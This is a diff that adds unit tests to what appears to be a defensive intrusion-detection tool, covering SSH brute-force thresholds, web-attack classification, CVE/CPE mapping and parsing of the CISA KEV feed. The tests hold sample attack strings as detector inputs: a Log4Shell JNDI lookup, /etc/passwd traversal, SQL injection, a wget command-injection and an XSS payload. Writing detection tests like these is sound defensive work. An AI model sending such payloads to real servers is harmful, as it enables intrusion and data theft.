@@ -9,6 +9,9 @@ const { WebhookAdapter, CloudflareAdapter } = require('../src/enforce');
 const seed = require('../src/seed');
 const { parseNetset, parseSpamhaus, cidrRange, ThreatIntel } = require('../src/intel/threatintel');
 const { parseNmapXml, looksLikeNmap } = require('../src/ingest/nmap');
+const detect = require('../src/engine/detect');
+const { softwareOf } = require('../src/intel/discover');
+const { KevCatalog } = require('../src/intel/kev');
 
 let n = 0;
 const tests = [];
@@ -17,6 +20,66 @@ const test = (name, fn) => tests.push([name, fn]);
 const log4j = seed.cves.find((c) => c.cve_id === 'CVE-2021-44228');
 const httpd = seed.cves.find((c) => c.cve_id === 'CVE-2021-41773');
 const host = (pkgs, services = []) => ({ installed_packages: pkgs, running_services: services });
+
+const logAt = (raw, sec, host = '10.0.0.5') => ({ ...normalizeLog(raw, { host_ip: host }).log, logged_at: new Date(Date.UTC(2026, 9, 17, 10, 0, sec)).toISOString() });
+const NOW = Date.UTC(2026, 9, 17, 10, 5, 0);
+
+test('detect: SSH brute force needs the threshold inside the window', () => {
+  const fail = (s) => logAt(`sshd[1]: Failed password for root from 203.0.113.9 port 1${s} ssh2`, s);
+  assert.strictEqual(detect.evaluate([1, 2, 3, 4].map(fail), {}, { now: NOW }).length, 0);
+  const hits = detect.evaluate([1, 2, 3, 4, 5].map(fail), {}, { now: NOW });
+  assert.strictEqual(hits.length, 1);
+  assert.strictEqual(hits[0].source_ip, '203.0.113.9');
+  assert.strictEqual(hits[0].dest_ip, '10.0.0.5');
+  // Spread over 50 minutes with a 10 minute window: no burst.
+  const slow = [0, 600, 1200, 1800, 2400].map((s) => ({ ...fail(1), logged_at: new Date(NOW - 3000000 + s * 1000).toISOString() }));
+  assert.strictEqual(detect.evaluate(slow, {}, { now: NOW }).length, 0);
+});
+
+test('detect: ids are stable so re-evaluation does not duplicate', () => {
+  const lines = [1, 2, 3, 4, 5].map((s) => logAt(`sshd[1]: Invalid user test from 198.51.100.4 port 22${s}`, s));
+  assert.strictEqual(detect.evaluate(lines, {}, { now: NOW })[0].alert_id, detect.evaluate(lines.slice().reverse(), {}, { now: NOW })[0].alert_id);
+});
+
+test('detect: web exploit classes and benign traffic', () => {
+  const req = (uri, ua = 'Mozilla/5.0') => logAt(`198.51.100.9 - - [17/Oct/2026:10:00:01 +0000] "GET ${uri} HTTP/1.1" 404 0 "-" "${ua}"`, 1);
+  const kind = (uri, ua) => (detect.classifyRequest(req(uri, ua)) || {}).id || null;
+  assert.strictEqual(kind('/a', '${jndi:ldap://x/a}'), 'log4shell');
+  assert.strictEqual(kind('/icons/.%2e/%2e%2e/etc/passwd'), 'traversal');
+  assert.strictEqual(kind('/item?id=1%27%20OR%201=1'), 'sqli');
+  assert.strictEqual(kind('/q?s=1+UNION+SELECT+password+FROM+users'), 'sqli');
+  assert.strictEqual(kind('/ping?h=1;wget%20http://x/s'), 'cmdi');
+  assert.strictEqual(kind('/.env'), 'secrets');
+  assert.strictEqual(kind('/search?q=%3Cscript%3Ealert(1)%3C/script%3E'), 'xss');
+  assert.strictEqual(kind('/products/union-select-shoes'), null);
+  assert.strictEqual(kind('/docs/getting-started.html'), null);
+  const scan = detect.evaluate(Array.from({ length: 20 }, (_, i) => req(`/p${i}`)), {}, { now: NOW });
+  assert.ok(scan.some((a) => a.external_ref === 'aegis:web-scanner'));
+});
+
+test('detect: rules can be switched off', () => {
+  const lines = [logAt('198.51.100.9 - - "GET /.env HTTP/1.1" 404 0', 1)];
+  assert.strictEqual(detect.evaluate(lines, {}, { now: NOW }).length, 1);
+  assert.strictEqual(detect.evaluate(lines, { detectDisabled: ['web-exploit'] }, { now: NOW }).length, 0);
+  assert.strictEqual(detect.evaluate(lines, { detectEnabled: false }, { now: NOW }).length, 0);
+});
+
+test('CVE discovery maps host software to NVD CPE match strings', () => {
+  const m = softwareOf({ running_services: [{ port: 22, service: 'OpenSSH 8.9p1' }, { port: 80, service: 'Apache httpd 2.4.49 (PHP 7.4.3)' }], installed_packages: ['log4j-core-2.14.1.jar', 'libssl3 3.0.13-0ubuntu3', 'left-pad 1.3.0'] }).map((s) => s.match);
+  assert.deepStrictEqual(m, ['cpe:2.3:a:openbsd:openssh:8.9', 'cpe:2.3:a:apache:http_server:2.4.49', 'cpe:2.3:a:php:php:7.4.3', 'cpe:2.3:a:apache:log4j:2.14.1', 'cpe:2.3:a:openssl:openssl:3.0.13']);
+});
+
+test('KEV catalog parses the CISA feed shape', async () => {
+  const body = { catalogVersion: '2026.10.16', dateReleased: '2026-10-16', count: 1, vulnerabilities: [{ cveID: 'CVE-2021-44228', vendorProject: 'Apache', product: 'Log4j2', vulnerabilityName: 'Apache Log4j2 RCE', dateAdded: '2021-12-10', dueDate: '2021-12-24', knownRansomwareCampaignUse: 'Known', requiredAction: 'Apply updates' }] };
+  const kev = new KevCatalog({ fetchImpl: async () => ({ ok: true, json: async () => body }) });
+  const k = await kev.lookup('cve-2021-44228');
+  assert.strictEqual(k.ransomware, true);
+  assert.strictEqual(kev.status().entries, 1);
+  assert.strictEqual(await kev.lookup('CVE-2000-0001'), null);
+  const down = new KevCatalog({ fetchImpl: async () => ({ ok: false, status: 503 }) });
+  assert.strictEqual(await down.lookup('CVE-2021-44228'), null);
+  assert.match(down.status().error, /503/);
+});
 
 test('CPE ranges: log4j 2.14.1 exposed, 2.17.1 and 2.12.2 not', () => {
   assert.ok(exposureFor(host(['log4j-core-2.14.1.jar']), log4j).exposed);
